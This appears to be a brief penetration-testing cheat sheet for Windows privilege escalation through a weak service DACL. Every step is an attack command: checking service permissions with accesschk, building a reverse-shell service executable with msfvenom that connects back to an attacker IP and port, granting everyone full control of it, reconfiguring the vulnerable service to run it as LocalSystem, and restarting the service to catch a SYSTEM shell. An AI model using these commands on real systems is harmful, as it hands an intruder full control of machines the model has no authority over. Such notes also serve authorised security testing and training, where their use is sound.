To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite (https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)

	accesschk64.exe -qlc [service]

After finding the service , create a malicious service executable

	msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Attacker IP] LPORT=[Attacker port] -f exe-service -o rev-svc.exe

Upload the malicious executable and mark it as executable to all users

	icacls [malicious exe] /grant EVERYONE:f

Set the service executable to the vulnerable service to be the malicious exe, with system as the account to run the service

	sc config [service] binPath= [path to maliciouse exe] obj= localSystem

Finaly, after setting up a listener, restart the service

	sc stop [service]
	sc start [service]
